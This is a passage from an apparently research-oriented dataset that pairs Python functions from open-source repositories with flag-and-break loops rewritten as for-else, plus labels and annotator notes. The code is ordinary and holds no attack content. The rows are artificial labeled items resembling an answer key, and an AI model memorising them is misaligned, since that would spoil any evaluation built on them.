    if network not in TEACHER_NODES:
        log.debug(f'{base_error}: Unknown network ""{network}"".')
        return

    ####
    # TODO: Clean this mess #1481 (Federated Mode)
    node_storage = LocalFileBasedNodeStorage(federated_only=federated_only)
    Ursula.set_cert_storage_function(node_storage.store_node_certificate)
    Ursula.set_federated_mode(federated_only)
    #####

    external_ip = None
    for teacher_uri in TEACHER_NODES[network]:
        try:
            teacher = Ursula.from_teacher_uri(teacher_uri=teacher_uri,
                                              federated_only=federated_only,
                                              min_stake=0)  # TODO: Handle customized min stake here.
            # TODO: Pass registry here to verify stake (not essential here since it's a hardcoded node)
            external_ip = _request_from_node(teacher=teacher)
            # Found a reachable teacher, return from loop
            if external_ip:
                break
        except NodeSeemsToBeDown:
            # Teacher is unreachable, try next one
            continue

    if not external_ip:
        log.debug(f'{base_error}: No teacher available for network ""{network}"".')
        return

    return external_ip","for teacher_uri in TEACHER_NODES[network]:
    try:
        teacher = Ursula.from_teacher_uri(teacher_uri=teacher_uri, federated_only=federated_only, min_stake=0)
        external_ip = _request_from_node(teacher=teacher)
        if external_ip:
            break
    except NodeSeemsToBeDown:
        continue
if not external_ip:
    log.debug(f'{base_error}: No teacher available for network ""{network}"".')
    return","for teacher_uri in TEACHER_NODES[network]:
    try:
        teacher = Ursula.from_teacher_uri(teacher_uri=teacher_uri, federated_only=federated_only, min_stake=0)
        external_ip = _request_from_node(teacher=teacher)
        if external_ip:
            break
    except NodeSeemsToBeDown:
        continue
else:
    log.debug(f'{base_error}: No teacher available for network ""{network}"".')
    return","for teacher_uri in TEACHER_NODES[network]:
    try:
        teacher = Ursula.from_teacher_uri(teacher_uri=teacher_uri, federated_only=federated_only, min_stake=0)
        external_ip = _request_from_node(teacher=teacher)
        if external_ip:
            break
    except NodeSeemsToBeDown:
        continue
else:
    log.debug(f'{base_error}: No teacher available for network ""{network}"".')
    return",1,"for teacher_uri in TEACHER_NODES[network]:
    try:
        teacher = Ursula.from_teacher_uri(teacher_uri=teacher_uri, federated_only=federated_only, min_stake=0)
        external_ip = _request_from_node(teacher=teacher)
        if external_ip:
            break
    except NodeSeemsToBeDown:
        continue
if not external_ip:
    log.debug(f'{base_error}: No teacher available for network ""{network}"".')
    return","break statement is executed:None
break statement is not executed:zejun1"
taskcat,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/taskcat/taskcat/_s3_sync.py,https://github.com/aws-ia/taskcat/tree/master/taskcat/_s3_sync.py,S3Sync,_iterate_files$100,"def _iterate_files(self, files, root, include_checksums, relpath):
        file_list = {}
        for file in files:
            exclude = False
            # exclude defined filename patterns
            for pattern in S3Sync.exclude_files:
                if fnmatch.fnmatch(file, pattern):
                    exclude = True
                    break
            if not exclude:
                full_path = root + ""/"" + file
                if include_checksums:
                    # get checksum
                    checksum = self._hash_file(full_path)
                else:
                    checksum = """"
                file_list[relpath + file] = [full_path, checksum]
        return file_list","for pattern in S3Sync.exclude_files:
    if fnmatch.fnmatch(file, pattern):
        exclude = True
        break
if not exclude:
    full_path = root + '/' + file
    if include_checksums:
        checksum = self._hash_file(full_path)
    else:
        checksum = ''
    file_list[relpath + file] = [full_path, checksum]","for pattern in S3Sync.exclude_files:
    if fnmatch.fnmatch(file, pattern):
        break
else:
    full_path = root + '/' + file
    if include_checksums:
        checksum = self._hash_file(full_path)
    else:
        checksum = ''
    file_list[relpath + file] = [full_path, checksum]","for pattern in S3Sync.exclude_files:
    if fnmatch.fnmatch(file, pattern):
        break
else:
    full_path = root + '/' + file
    if include_checksums:
        checksum = self._hash_file(full_path)
    else:
        checksum = ''
    file_list[relpath + file] = [full_path, checksum]",1,"for pattern in S3Sync.exclude_files:
    if fnmatch.fnmatch(file, pattern):
        exclude = True
        break
if not exclude:
    full_path = root + '/' + file
    if include_checksums:
        checksum = self._hash_file(full_path)
    else:
        checksum = ''
    file_list[relpath + file] = [full_path, checksum]","break statement is executed:None
break statement is not executed:zejun1"
taskwiki,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/taskwiki/tests/base.py,https://github.com/tools-life/taskwiki/tree/master/tests/base.py,IntegrationTest,test_execute$207,"def test_execute(self):
        # First, run sanity checks
        success = False

        for i in range(5):
            if self.check_sanity(soft=True):
                success = True
                break
            else:
                self.teardown()
                self.setup()

        if not success:
            self.check_sanity(soft=False)

        # Then load the input
        if self.viminput:
            # Unindent the lines
            lines = [self.fill_uuid(line[4:])
                     for line in self.viminput.strip('\n').splitlines()]
            self.write_buffer(lines)

        # Do the stuff
        self.execute()

        # Check expected output
        if self.vimoutput:
            lines = [
                self.fill_uuid(line[4:])
                for line in self.vimoutput.strip('\n').splitlines()[:-1]
            ]
            assert self.read_buffer() == lines","for i in range(5):
    if self.check_sanity(soft=True):
        success = True
        break
    else:
        self.teardown()
        self.setup()
if not success:
    self.check_sanity(soft=False)","for i in range(5):
    if self.check_sanity(soft=True):
        break
    else:
        self.teardown()
        self.setup()
else:
    self.check_sanity(soft=False)","for i in range(5):
    if self.check_sanity(soft=True):
        break
    else:
        self.teardown()
        self.setup()
else:
    self.check_sanity(soft=False)",1,"for i in range(5):
    if self.check_sanity(soft=True):
        success = True
        break
    else:
        self.teardown()
        self.setup()
if not success:
    self.check_sanity(soft=False)","break statement is executed:None
break statement is not executed:zejun1"
ihatemoney,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/ihatemoney/ihatemoney/web.py,https://github.com/spiral-project/ihatemoney/tree/master/ihatemoney/web.py,,import_project$455,"def import_project(file, project):
    json_file = json.load(file)

    # Check if JSON is correct
    attr = [""what"", ""payer_name"", ""payer_weight"", ""amount"", ""currency"", ""date"", ""owers""]
    attr.sort()
    currencies = set()
    for e in json_file:
        # If currency is absent, empty, or explicitly set to XXX
        # set it to project default.
        if e.get(""currency"", """") in ["""", ""XXX""]:
            e[""currency""] = project.default_currency
        if len(e) != len(attr):
            raise ValueError(_(""Invalid JSON""))
        list_attr = []
        for i in e:
            list_attr.append(i)
        list_attr.sort()
        if list_attr != attr:
            raise ValueError(_(""Invalid JSON""))
        # Keep track of currencies
        currencies.add(e[""currency""])

    # Additional checks if project has no default currency
    if project.default_currency == CurrencyConverter.no_currency:
        # If bills have currencies, they must be consistent
        if len(currencies - {CurrencyConverter.no_currency}) >= 2:
            raise ValueError(
                _(
                    ""Cannot add bills in multiple currencies to a project without default currency""
                )
            )
        # Strip currency from bills (since it's the same for every bill)
        for e in json_file:
            e[""currency""] = CurrencyConverter.no_currency

    # From json : export list of members
    members_json = get_members(json_file)
    members = project.members
    members_already_here = list()
    for m in members:
        members_already_here.append(str(m))

    # List all members not in the project and weight associated
    # List of tuples (name,weight)
    members_to_add = list()
    for i in members_json:
        if str(i[0]) not in members_already_here:
            members_to_add.append(i)

    # List bills not in the project
    # Same format than JSON element
    project_bills = project.get_pretty_bills()
    bill_to_add = list()
    for j in json_file:
        same = False
        for p in project_bills:
            if same_bill(p, j):
                same = True
                break
        if not same:
            bill_to_add.append(j)

    # Add users to DB
    for m in members_to_add:
        Person(name=m[0], project=project, weight=m[1])
    db.session.commit()

    id_dict = {}
    for i in project.members:
        id_dict[i.name] = i.id

    # Create bills
    for b in bill_to_add:
        owers_id = list()
        for ower in b[""owers""]:
            owers_id.append(id_dict[ower])

        bill = Bill()
        form = get_billform_for(project)
        form.what = b[""what""]
        form.amount = b[""amount""]
        form.original_currency = b[""currency""]
        form.date = parse(b[""date""])
        form.payer = id_dict[b[""payer_name""]]
        form.payed_for = owers_id

        db.session.add(form.fake_form(bill, project))

    # Add bills to DB
    db.session.commit()","for p in project_bills:
    if same_bill(p, j):
        same = True
        break
if not same:
    bill_to_add.append(j)","for p in project_bills:
    if same_bill(p, j):
        break
else:
    bill_to_add.append(j)","for p in project_bills:
    if same_bill(p, j):
        break
else:
    bill_to_add.append(j)",1,"for p in project_bills:
    if same_bill(p, j):
        same = True
        break
if not same:
    bill_to_add.append(j)","break statement is executed:None
break statement is not executed:zejun1"
nematus,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/nematus/nematus/model_updater.py,https://github.com/EdinburghNLP/nematus/tree/master/nematus/model_updater.py,_ModelUpdateGraph,_sum_gradients$694,"def _sum_gradients(self, all_grad_vars, weights):
        """"""Computes the weighted sums of gradients from multiple sub-batches.

        Args:
            all_grad_vars: a list of lists of (gradient, variable) pairs. The
                outer list should contain one entry for each sub-batch. Each
                inner list should contain the optimizer's (gradient, variable)
                list for that sub-batch.
            weights: a list containing the normalized weight of each sub-batch.

        Returns:
            A list of (gradient, variable) pairs.
        """"""
        # Create a dictionary mapping each variable name to a list of
        # (gradient, variable) pairs (one pair from each sub-batch).
        d = {}
        for grad_vars in all_grad_vars:
            for g, v in grad_vars:
                if v.name not in d:
                    d[v.name] = []
                d[v.name].append((g, v))

        # For each variable, sum the gradients from all sub-batches and store
        # the result in avg_grad_vars.
        avg_grad_vars = []
        for var_name, gv_list in list(d.items()):
            var = gv_list[0][1]
            found_none_value = False
            for g, v in gv_list:
                if g is None:
                    found_none_value = True
                    break
            if found_none_value:
                avg_grad_vars.append((None, var))
            else:
                weighted_grads = []
                for i, (g, v) in enumerate(gv_list):
                    assert v == var
                    expanded = tf.expand_dims(g * weights[i], 0)
                    weighted_grads.append(expanded)
                tmp = tf.concat(axis=0, values=weighted_grads)
                avg_grad = tf.reduce_sum(input_tensor=tmp, axis=0)
                avg_grad_vars.append((avg_grad, var))

        return avg_grad_vars","for (g, v) in gv_list:
    if g is None:
        found_none_value = True
        break
if found_none_value:
    avg_grad_vars.append((None, var))
else:
    weighted_grads = []
    for (i, (g, v)) in enumerate(gv_list):
        assert v == var
        expanded = tf.expand_dims(g * weights[i], 0)
        weighted_grads.append(expanded)
    tmp = tf.concat(axis=0, values=weighted_grads)
    avg_grad = tf.reduce_sum(input_tensor=tmp, axis=0)
    avg_grad_vars.append((avg_grad, var))","for (g, v) in gv_list:
    if g is None:
        avg_grad_vars.append((None, var))
        break
else:
    weighted_grads = []
    for (i, (g, v)) in enumerate(gv_list):
        assert v == var
        expanded = tf.expand_dims(g * weights[i], 0)
        weighted_grads.append(expanded)
    tmp = tf.concat(axis=0, values=weighted_grads)
    avg_grad = tf.reduce_sum(input_tensor=tmp, axis=0)
    avg_grad_vars.append((avg_grad, var))","for (g, v) in gv_list:
    if g is None:
        avg_grad_vars.append((None, var))
        break
else:
    weighted_grads = []
    for (i, (g, v)) in enumerate(gv_list):
        assert v == var
        expanded = tf.expand_dims(g * weights[i], 0)
        weighted_grads.append(expanded)
    tmp = tf.concat(axis=0, values=weighted_grads)
    avg_grad = tf.reduce_sum(input_tensor=tmp, axis=0)
    avg_grad_vars.append((avg_grad, var))",1,"for (g, v) in gv_list:
    if g is None:
        found_none_value = True
        break
if found_none_value:
    avg_grad_vars.append((None, var))
else:
    weighted_grads = []
    for (i, (g, v)) in enumerate(gv_list):
        assert v == var
        expanded = tf.expand_dims(g * weights[i], 0)
        weighted_grads.append(expanded)
    tmp = tf.concat(axis=0, values=weighted_grads)
    avg_grad = tf.reduce_sum(input_tensor=tmp, axis=0)
    avg_grad_vars.append((avg_grad, var))","break statement is executed:zejun1
break statement is not executed:None"
circus,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/circus/circus/tests/test_arbiter.py,https://github.com/circus-tent/circus/tree/master/circus/tests/test_arbiter.py,TestTrainer,_test_udp_discovery$548,"def _test_udp_discovery(self):
        """"""test_udp_discovery: Test that when the circusd answer UDP call.

        """"""
        yield self._stop_runners()

        dummy_process = 'circus.tests.support.run_process'
        self._run_circus(dummy_process)

        ANY = '0.0.0.0'

        multicast_addr, multicast_port = urlparse(DEFAULT_ENDPOINT_MULTICAST)\
            .netloc.split(':')

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM,
                             socket.IPPROTO_UDP)
        sock.bind((ANY, 0))
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        sock.sendto(json.dumps(''),
                    (multicast_addr, int(multicast_port)))

        timer = time()
        resp = False
        endpoints = []
        while time() - timer < 10:
            data, address = sock.recvfrom(1024)
            data = json.loads(data)
            endpoint = data.get('endpoint', """")

            if endpoint == DEFAULT_ENDPOINT_DEALER:
                resp = True
                break

            endpoints.append(endpoint)

        if not resp:
            print(endpoints)

        self.assertTrue(resp)","while time() - timer < 10:
    (data, address) = sock.recvfrom(1024)
    data = json.loads(data)
    endpoint = data.get('endpoint', '')
    if endpoint == DEFAULT_ENDPOINT_DEALER:
        resp = True
        break
    endpoints.append(endpoint)
if not resp:
    print(endpoints)","while time() - timer < 10:
    (data, address) = sock.recvfrom(1024)
    data = json.loads(data)
    endpoint = data.get('endpoint', '')
    if endpoint == DEFAULT_ENDPOINT_DEALER:
        resp = True
        break
    endpoints.append(endpoint)
else:
    print(endpoints)","while time() - timer < 10:
    (data, address) = sock.recvfrom(1024)
    data = json.loads(data)
    endpoint = data.get('endpoint', '')
    if endpoint == DEFAULT_ENDPOINT_DEALER:
        resp = True
        break
    endpoints.append(endpoint)
else:
    print(endpoints)",1,"while time() - timer < 10:
    (data, address) = sock.recvfrom(1024)
    data = json.loads(data)
    endpoint = data.get('endpoint', '')
    if endpoint == DEFAULT_ENDPOINT_DEALER:
        resp = True
        break
    endpoints.append(endpoint)
if not resp:
    print(endpoints)","break statement is executed:None
break statement is not executed:zejun1"
lit,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/lit/lit_nlp/components/minimal_targeted_counterfactuals.py,https://github.com/PAIR-code/lit/tree/master/lit_nlp/components/minimal_targeted_counterfactuals.py,TabularMTC,_sort_and_filter_examples$624,"def _sort_and_filter_examples(self, examples: List[JsonDict],
                                ref_example: JsonDict, fields: List[Text],
                                dataset: lit_dataset.Dataset,
                                dataset_name: Text) -> List[JsonDict]:
    # Keep only those examples which field values are different from the
    # reference example.
    filtered_examples = []
    for example in examples:
      should_keep = True
      for field in fields:
        if example[field] == ref_example[field]:
          should_keep = False
          break
      if should_keep:
        filtered_examples.append(example)

    if not filtered_examples:
      return []

    # Deduplicate examples.
    dedup_hashes = set()
    dedup_examples = []
    for example in filtered_examples:
      h = self._create_hash(example, fields)
      if h not in dedup_hashes:
        dedup_examples.append(example)
        dedup_hashes.add(h)

    if len(dedup_examples) > MAX_EXAMPLES_PER_COMBINATION:
      dedup_examples = dedup_examples[:MAX_EXAMPLES_PER_COMBINATION]

    # Calculate distances with respect to the reference example taking into
    # consideration only the given fields.
    distances = []  # type: List[float]
    for example in dedup_examples:
      distance, _ = self._calculate_L1_distance(
          example_1=example,
          example_2=ref_example,
          dataset=dataset,
          dataset_name=dataset_name,
          field_names=fields)
      distances.append(distance)

    # Sort the filtered examples based on the distances.
    sorted_tuples = list(
        zip(*sorted(zip(dedup_examples, distances), key=lambda e: e[1])))[0]
    return list(sorted_tuples)","for field in fields:
    if example[field] == ref_example[field]:
        should_keep = False
        break
if should_keep:
    filtered_examples.append(example)","for field in fields:
    if example[field] == ref_example[field]:
        break
else:
    filtered_examples.append(example)","for field in fields:
    if example[field] == ref_example[field]:
        break
else:
    filtered_examples.append(example)",1,"for field in fields:
    if example[field] == ref_example[field]:
        should_keep = False
        break
if should_keep:
    filtered_examples.append(example)","break statement is executed:None
break statement is not executed:zejun1"
samsungctl,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/samsungctl/samsungctl/__main__.py,https://github.com/Ape/samsungctl/tree/master/samsungctl/__main__.py,,_read_config$16,"def _read_config():
    config = collections.defaultdict(lambda: None, {
        ""name"": ""samsungctl"",
        ""description"": ""PC"",
        ""id"": """",
        ""method"": ""legacy"",
        ""timeout"": 0,
    })

    file_loaded = False
    directories = []

    xdg_config = os.getenv(""XDG_CONFIG_HOME"")
    if xdg_config:
        directories.append(xdg_config)

    directories.append(os.path.join(os.getenv(""HOME""), "".config""))
    directories.append(""/etc"")

    for directory in directories:
        path = os.path.join(directory, ""samsungctl.conf"")
        try:
            config_file = open(path)
        except IOError as e:
            if e.errno == errno.ENOENT:
                continue
            else:
                raise
        else:
            file_loaded = True
            break

    if not file_loaded:
        return config

    with config_file:
        try:
            config_json = json.load(config_file)
        except ValueError as e:
            message = ""Warning: Could not parse the configuration file.\n  %s""
            logging.warning(message, e)
            return config

        config.update(config_json)

    return config","for directory in directories:
    path = os.path.join(directory, 'samsungctl.conf')
    try:
        config_file = open(path)
    except IOError as e:
        if e.errno == errno.ENOENT:
            continue
        else:
            raise
    else:
        file_loaded = True
        break
if not file_loaded:
    return config","for directory in directories:
    path = os.path.join(directory, 'samsungctl.conf')
    try:
        config_file = open(path)
    except IOError as e:
        if e.errno == errno.ENOENT:
            continue
        else:
            raise
    else:
        break
else:
    return config","for directory in directories:
    path = os.path.join(directory, 'samsungctl.conf')
    try:
        config_file = open(path)
    except IOError as e:
        if e.errno == errno.ENOENT:
            continue
        else:
            raise
    else:
        break
else:
    return config",1,"for directory in directories:
    path = os.path.join(directory, 'samsungctl.conf')
    try:
        config_file = open(path)
    except IOError as e:
        if e.errno == errno.ENOENT:
            continue
        else:
            raise
    else:
        file_loaded = True
        break
if not file_loaded:
    return config","break statement is executed:None
break statement is not executed:zejun1"
prjxray,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/prjxray/prjxray/fasm_disassembler.py,https://github.com/SymbiFlow/prjxray/tree/master/prjxray/fasm_disassembler.py,FasmDisassembler,find_features_in_bitstream$97,"def find_features_in_bitstream(self, bitdata, verbose=False):
        solved_bitdata = {}
        frames = set(bitdata.keys())
        tiles_checked = set()

        emitted_features = set()

        while len(frames) > 0:
            frame = frames.pop()

            # Skip frames that were emptied in a previous iteration.
            if not bitdata[frame]:
                continue

            # Iterate over all tiles that use this frame.
            for bits_info in self.segment_map.segment_info_for_frame(frame):
                # Don't examine a tile twice
                if (bits_info.tile, bits_info.block_type) in tiles_checked:
                    continue

                # Check if this frame has any data for the relevant tile.
                any_column = False
                for word_idx in range(bits_info.bits.words):
                    if word_idx + bits_info.bits.offset in bitdata[frame][0]:
                        any_column = True
                        break

                if not any_column:
                    continue

                tiles_checked.add((bits_info.tile, bits_info.block_type))

                for fasm_line in self.find_features_in_tile(
                        bits_info.tile, bits_info.block_type, bits_info.bits,
                        solved_bitdata, bitdata, verbose=verbose):
                    if fasm_line not in emitted_features:
                        emitted_features.add(fasm_line)
                        yield fasm_line

            remaining_bits = bitdata[frame][1]
            if frame in solved_bitdata:
                remaining_bits -= solved_bitdata[frame]

            if len(remaining_bits) > 0 and verbose:
                # Some bits were not decoded, add warning and annotations to
                # FASM.
                yield fasm.FasmLine(
                    set_feature=None,
                    annotations=None,
                    comment="" In frame 0x{:08x} {} bits were not converted."".
                    format(
                        frame,
                        len(remaining_bits),
                    ))

                for bit in sorted(remaining_bits):
                    frame_offset = frame % bitstream.FRAME_ALIGNMENT
                    aligned_frame = frame - frame_offset
                    wordidx = bit // bitstream.WORD_SIZE_BITS
                    bitidx = bit % bitstream.WORD_SIZE_BITS

                    annotations = []
                    annotations.append(
                        fasm.Annotation(
                            'unknown_bit', '{:08x}_{}_{}'.format(
                                frame, wordidx, bitidx)))
                    annotations.append(
                        fasm.Annotation(
                            'unknown_segment',
                            '0x{:08x}'.format(aligned_frame)))
                    annotations.append(
                        fasm.Annotation(
                            'unknown_segbit', '{:02d}_{:02d}'.format(
                                frame_offset, bit)))
                    yield fasm.FasmLine(
                        set_feature=None,
                        annotations=tuple(annotations),
                        comment=None,
                    )","for word_idx in range(bits_info.bits.words):
    if word_idx + bits_info.bits.offset in bitdata[frame][0]:
        any_column = True
        break
if not any_column:
    continue","for word_idx in range(bits_info.bits.words):
    if word_idx + bits_info.bits.offset in bitdata[frame][0]:
        break
else:
    continue","for word_idx in range(bits_info.bits.words):
    if word_idx + bits_info.bits.offset in bitdata[frame][0]:
        break
else:
    continue",1,"for word_idx in range(bits_info.bits.words):
    if word_idx + bits_info.bits.offset in bitdata[frame][0]:
        any_column = True
        break
if not any_column:
    continue","break statement is executed:None
break statement is not executed:zejun1"
anchore-engine,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/anchore-engine/anchore_engine/clients/docker_registry.py,https://github.com/anchore/anchore-engine/tree/master/anchore_engine/clients/docker_registry.py,,ping_docker_registry_v2$104,"def ping_docker_registry_v2(base_url, u, p, verify=True):
    httpcode = 500
    message = ""unknown failure""

    try:
        # base_url is of the form 'https://index.docker.io' or 'https://mydocker.com:5000' <-- note: https only, no trailing slash, etc
        index_url = ""{}/v2"".format(base_url)

        last_exception = None
        for i_url in [index_url, ""{}/"".format(index_url)]:
            try:
                r = requests.get(i_url, verify=verify, allow_redirects=True)
                index_url = i_url
                last_exception = None
            except Exception as err:
                last_exception = Exception(err)

        if last_exception:
            httpcode = 500
            raise last_exception

        try:
            if r.status_code in [404]:
                r = requests.get(index_url + ""/"", verify=verify, allow_redirects=True)
            if r.status_code not in [200, 401]:
                httpcode = 400
                raise Exception(
                    ""cannot access registry using registry version 2 {}"".format(
                        index_url
                    )
                )
        except Exception as err:
            raise err

        auth_tries = []
        if u and p:
            auth_url = None
            try:
                for hkey in r.headers.keys():
                    urlparams = []
                    if hkey.lower() == ""www-authenticate"":
                        www_auth = r.headers.get(hkey)
                        (www_auth_type, www_auth_raw) = re.match(
                            ""(.*?) +(.*)"", www_auth
                        ).groups()
                        if www_auth_type == ""Bearer"":
                            keyvals = shlex.shlex(www_auth_raw, posix=True)
                            keyvals.whitespace_split = True
                            keyvals.whitespace = "",""
                            for keyval in keyvals:
                                (key, val) = keyval.split(""="", 1)
                                if key.lower() == ""realm"":
                                    auth_url = val.replace('""', """")
                                else:
                                    urlparams.append(key + ""="" + val.replace('""', """"))
                        elif www_auth_type == ""Basic"":
                            auth_url = index_url
                        else:
                            auth_url = index_url

                    if auth_url:
                        if urlparams:
                            param_auth_url = auth_url + ""?"" + ""&"".join(urlparams)
                            auth_tries.append(param_auth_url)
                        if auth_url not in auth_tries:
                            auth_tries.append(auth_url)

                if not auth_url:
                    httpcode = 400
                    raise Exception(""could not retrieve an auth URL from response"")
            except Exception as err:
                raise err

            if index_url not in auth_tries:
                auth_tries.append(index_url)

            logged_in = False
            for auth_url in auth_tries:
                try:
                    r = requests.get(auth_url, auth=(u, p), verify=verify)
                except Exception as err:
                    httpcode = 500
                    raise err

                try:
                    if r.status_code in [404]:
                        r = requests.get(auth_url + ""/"", auth=(u, p), verify=verify)
                    if r.status_code not in [200]:
                        httpcode = 401
                    else:
                        logged_in = True
                        break
                except Exception as err:
                    raise err
            if not logged_in:
                httpcode = 401
                raise Exception(
                    ""cannot login to registry user={} registry={} - invalid username/password"".format(
                        u, base_url
                    )
                )

            httpcode = 200
            message = ""login successful""
        else:
            httpcode = 200
            message = ""no credentials supplied - assuming anonymous""
    except Exception as err:
        message = ""{}"".format(err)

    return httpcode, message","for auth_url in auth_tries:
    try:
        r = requests.get(auth_url, auth=(u, p), verify=verify)
    except Exception as err:
        httpcode = 500
        raise err
    try:
        if r.status_code in [404]:
            r = requests.get(auth_url + '/', auth=(u, p), verify=verify)
        if r.status_code not in [200]:
            httpcode = 401
        else:
            logged_in = True
            break
    except Exception as err:
        raise err
if not logged_in:
    httpcode = 401
    raise Exception('cannot login to registry user={} registry={} - invalid username/password'.format(u, base_url))","for auth_url in auth_tries:
    try:
        r = requests.get(auth_url, auth=(u, p), verify=verify)
    except Exception as err:
        httpcode = 500
        raise err
    try:
        if r.status_code in [404]:
            r = requests.get(auth_url + '/', auth=(u, p), verify=verify)
        if r.status_code not in [200]:
            httpcode = 401
        else:
            break
    except Exception as err:
        raise err
else:
    httpcode = 401
    raise Exception('cannot login to registry user={} registry={} - invalid username/password'.format(u, base_url))","for auth_url in auth_tries:
    try:
        r = requests.get(auth_url, auth=(u, p), verify=verify)
    except Exception as err:
        httpcode = 500
        raise err
    try:
        if r.status_code in [404]:
            r = requests.get(auth_url + '/', auth=(u, p), verify=verify)
        if r.status_code not in [200]:
            httpcode = 401
        else:
            break
    except Exception as err:
        raise err
else:
    httpcode = 401
    raise Exception('cannot login to registry user={} registry={} - invalid username/password'.format(u, base_url))",1,"for auth_url in auth_tries:
    try:
        r = requests.get(auth_url, auth=(u, p), verify=verify)
    except Exception as err:
        httpcode = 500
        raise err
    try:
        if r.status_code in [404]:
            r = requests.get(auth_url + '/', auth=(u, p), verify=verify)
        if r.status_code not in [200]:
            httpcode = 401
        else:
            logged_in = True
            break
    except Exception as err:
        raise err
if not logged_in:
    httpcode = 401
    raise Exception('cannot login to registry user={} registry={} - invalid username/password'.format(u, base_url))","break statement is executed:None
break statement is not executed:zejun1"
osroom,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/osroom/apps/modules/plug_in_manager/process/setting.py,https://github.com/osroom/osroom/tree/master/apps/modules/plug_in_manager/process/setting.py,,install_require_package$201,"def install_require_package():
    """"""
    安装插件需要的其他python 包
    :return:
    """"""

    plugin_name = request.argget.all('plugin_name')
    s, r = arg_verify(reqargs=[(""plugin name"", plugin_name)], required=True)
    if not s:
        return r
    plugin_req_file_path = ""{}/requirements.txt"".format(
        os.path.join(PLUG_IN_FOLDER, plugin_name))
    if not os.path.exists(plugin_req_file_path):
        data = {
            ""msg"": gettext(""There is no requirement file""),
            ""msg_type"": ""e"",
            ""custom_status"": 400}
        return data

    with open(plugin_req_file_path) as rf:
        new_reqs = rf.read().split()

    hosts = mdbs[""sys""].db.sys_host.find({""host_info.local_ip"": {""$exists"": True}})
    connection_failed = []
    for host in hosts:
        host_info = host[""host_info""]
        s, v = audit_host_info(host_info)
        if not s:
            connection_failed.append(
                {""host_ip"": host_info[""local_ip""], ""error"": r})
            continue
        else:
            try:
                ssh = MySSH(host=host_info[""local_ip""], port=host_info[""port""],
                            username=host_info[""username""],
                            password=host_info[""password""])
            except BaseException as e:
                connection_failed.append(
                    {""host_ip"": host_info[""local_ip""], ""error"": str(e)})
                continue
            if not ssh:
                connection_failed.append(
                    {""host_ip"": host_info[""local_ip""], ""error"": ""Failed to connect to server host""})
                continue
        ssh.close()
        install_process(plugin_name, host_info, new_reqs)
        install_process.apply_async(
            kwargs={
                ""plugin_name"": plugin_name,
                ""host_info"": host_info,
                ""packages"": new_reqs
            }
        )

    if connection_failed:
        # 更新插件需求包安装状态
        plugin = mdbs[""sys""].db.plugin.find_one({""plugin_name"": plugin_name}, {
                                            ""require_package_install_result"": 1})
        for connect in connection_failed:

            if ""require_package_install_result"" in plugin and plugin[
                    ""require_package_install_result""]:
                updated = False
                for old_result in plugin[""require_package_install_result""]:
                    if old_result[""host_ip""] == connect[""host_ip""]:
                        old_result[""error""] = connect[""error""]
                        old_result[""time""] = time.time()
                        updated = True
                        break

                if not updated:
                    result = {
                        ""host_ip"": connect[""host_ip""],
                        ""error"": connect[""error""],
                        ""time"": time.time()
                    }
                    plugin[""require_package_install_result""].append(result)

            else:
                plugin[""require_package_install_result""] = [{
                    ""host_ip"": connect[""host_ip""],
                    ""error"": connect[""error""],
                    ""time"": time.time()}]

        mdbs[""sys""].db.plugin.update_one({""plugin_name"": plugin_name}, {""$set"": {
                                     ""require_package_install_result"": plugin[""require_package_install_result""]}})

        data = {
            ""msg"": gettext(""Some host connections failed. Successfully connected host has installed requirements package in the background""),
            ""data"": connection_failed,
            ""msg_type"": ""w"",
            ""custom_status"": 201}
    else:
        data = {
            ""msg"": gettext(""Executed related installation commands in the background""),
            ""msg_type"": ""s"",
            ""custom_status"": 201}
    return data","for old_result in plugin['require_package_install_result']:
    if old_result['host_ip'] == connect['host_ip']:
        old_result['error'] = connect['error']
        old_result['time'] = time.time()
        updated = True
        break
if not updated:
    result = {'host_ip': connect['host_ip'], 'error': connect['error'], 'time': time.time()}
    plugin['require_package_install_result'].append(result)","for old_result in plugin['require_package_install_result']:
    if old_result['host_ip'] == connect['host_ip']:
        old_result['error'] = connect['error']
        old_result['time'] = time.time()
        break
else:
    result = {'host_ip': connect['host_ip'], 'error': connect['error'], 'time': time.time()}
    plugin['require_package_install_result'].append(result)","for old_result in plugin['require_package_install_result']:
    if old_result['host_ip'] == connect['host_ip']:
        old_result['error'] = connect['error']
        old_result['time'] = time.time()
        break
else:
    result = {'host_ip': connect['host_ip'], 'error': connect['error'], 'time': time.time()}
    plugin['require_package_install_result'].append(result)",1,"for old_result in plugin['require_package_install_result']:
    if old_result['host_ip'] == connect['host_ip']:
        old_result['error'] = connect['error']
        old_result['time'] = time.time()
        updated = True
        break
if not updated:
    result = {'host_ip': connect['host_ip'], 'error': connect['error'], 'time': time.time()}
    plugin['require_package_install_result'].append(result)","break statement is executed:None
break statement is not executed:zejun1"
BERT-Classification-Tutorial,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/BERT-Classification-Tutorial/tokenization.py,https://github.com/Socialbird-AILab/BERT-Classification-Tutorial/tree/master//tokenization.py,WordpieceTokenizer,tokenize$201,"def tokenize(self, text):
        """"""Tokenizes a piece of text into its word pieces.

        This uses a greedy longest-match-first algorithm to perform tokenization
        using the given vocabulary.

        For example:
          input = ""unaffable""
          output = [""un"", ""##aff"", ""##able""]

        Args:
          text: A single token or whitespace separated tokens. This should have
            already been passed through `BasicTokenizer.

        Returns:
          A list of wordpiece tokens.
        """"""

        text = convert_to_unicode(text)

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
